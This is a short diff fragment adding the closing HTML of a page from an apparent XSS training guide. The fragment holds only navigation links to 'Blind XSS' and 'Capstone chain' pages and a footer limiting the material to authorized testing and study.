+<p>For applying these against admin-targeted blind XSS scenarios, see <a href="../blind-xss/index.html">Blind XSS</a>. For the capstone chain that combines multiple bypasses with stored XSS and CSRF, see <a href="../capstone-chain/index.html">Capstone chain</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../payload-construction/index.html">Previous: Payload Construction</a><a class="cx-next" href="../blind-xss/index.html">Next: Blind XSS</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
